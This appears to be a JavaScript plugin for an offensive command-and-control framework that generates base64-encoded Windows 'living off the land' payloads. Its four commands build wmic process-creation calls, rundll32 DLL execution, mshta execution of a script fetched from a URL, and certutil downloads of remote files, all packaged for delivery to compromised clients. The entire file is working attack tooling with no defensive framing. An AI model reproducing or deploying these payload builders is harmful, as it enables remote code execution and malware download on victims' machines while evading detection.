// Register a plugin
module.exports = {
    name: 'LOLBins',
    type: 'client',
    description: 'A client plugin that provides Windows LOLBin commands.',
    commands: {
        'wmic': {
            name: 'wmic',
            method: 'payload-cmd',
            description: `execute <command> Executes a remote command using wmic.exe.`,
            parameters: {
                'method': 'Only method currently supported is "execute"',
                'command': 'The command to execute.'
            },
            handler: (props) => {            
                const commands = {
                    'execute': {
                        params: ['command'],
                        format: (props) => `wmic.exe process call create "${props[0]}"`,
                    }
                };
            
                // Validate props
                if (!Array.isArray(props) || props.length === 0) {
                    throw new Error('Command properties must be provided.');
                }
            
                const command = props[0].toLowerCase();
                const parameters = props.slice(1);
            
                // Check if command is valid
                if (!commands[command]) {
                    throw new Error('Invalid command.');
                }
            
                const commandObj = commands[command];
                const paramValues = parameters.slice(0, commandObj.params.length);
                const formattedCommand = commandObj.format(paramValues);
            
                // Encode the command to base64
                return Buffer.from(formattedCommand).toString('base64');
            }
        },
        'rundll': {
            name: 'rundll',
            method: 'payload-cmd',
            description: `execute <dllFile> <entryPoint> Execute a DLL using rundll32.exe`,
            parameters: {
                'method': 'Only method currently supported is "execute"',
                'dllPath': 'The path to the DLL file.',
                'entryPoint': 'The entry point within the DLL.'
            },
            handler: (props) => {            
                const commands = {
                    'execute': {
                        params: ['dllPath', 'entryPoint'],
                        format: (props) => `rundll32.exe ${props[0]},${props[1]}`,
                    }
                };

                // Validate props
                if (!Array.isArray(props) || props.length === 0) {
                    throw new Error('Command properties must be provided.');
                }
            
                const command = props[0].toLowerCase();
                const parameters = props.slice(1);
            
                // Check if command is valid
                if (!commands[command]) {
                    throw new Error('Invalid command.');
                }
            
                const commandObj = commands[command];
                const paramValues = parameters.slice(0, commandObj.params.length);
                const formattedCommand = commandObj.format(paramValues);
            
                // Encode the command to base64
                return Buffer.from(formattedCommand).toString('base64');
            }
        },
        'mshta': {
            name: 'mshta',
            method: 'payload-cmd',
            parameters: {
                'method': 'Only method currently supported is "execute"',
                'url': 'The url where the script is hosted.'
            },
            description: 'Executes a script from a specified URL using mshta.exe.',
            handler: (props) => {
                const commands = {
                    'execute': {
                        params: ['url'],
                        format: (props) => `mshta.exe ${props[0]}`,
                    }
                };
            
                // Validate props
                if (!Array.isArray(props) || props.length === 0) {
                    throw new Error('Command properties must be provided.');
                }
            
                const command = props[0].toLowerCase();
                const parameters = props.slice(1);
            
                // Check if command is valid
                if (!commands[command]) {
                    throw new Error('Invalid command.');
                }
            
                const commandObj = commands[command];
                const paramValues = parameters.slice(0, commandObj.params.length);
                const formattedCommand = commandObj.format(paramValues);
            
                // Encode the command to base64
                return Buffer.from(formattedCommand).toString('base64');
            }
        },
        'certutil': {
            name: 'certutil',
            method: 'payload-cmd',
            parameters: {
                'method': 'The only supported method is "download".',
                'url': 'The file url.',
                'outputPath': 'The output path where the file will be saved.'
            },
            description: 'Downloads a file from a URL and saves it to a specified path using certutil.exe.',
            handler: (props) => {
                const commands = {
                    'download': {
                        params: ['url', 'outputPath'],
                        format: (props) => `certutil.exe -urlcache -split -f ${props[0]} ${props[1]}`,
                    }
                };
            
                // Validate props
                if (!Array.isArray(props) || props.length === 0) {
                    throw new Error('Command properties must be provided.');
                }
            
                const command = props[0].toLowerCase();
                const parameters = props.slice(1);
            
                // Check if command is valid
                if (!commands[command]) {
                    throw new Error('Invalid command.');
                }
            
                const commandObj = commands[command];
                const paramValues = parameters.slice(0, commandObj.params.length);
                const formattedCommand = commandObj.format(paramValues);
            
                // Encode the command to base64
                return Buffer.from(formattedCommand).toString('base64');
            }
        }
    }
};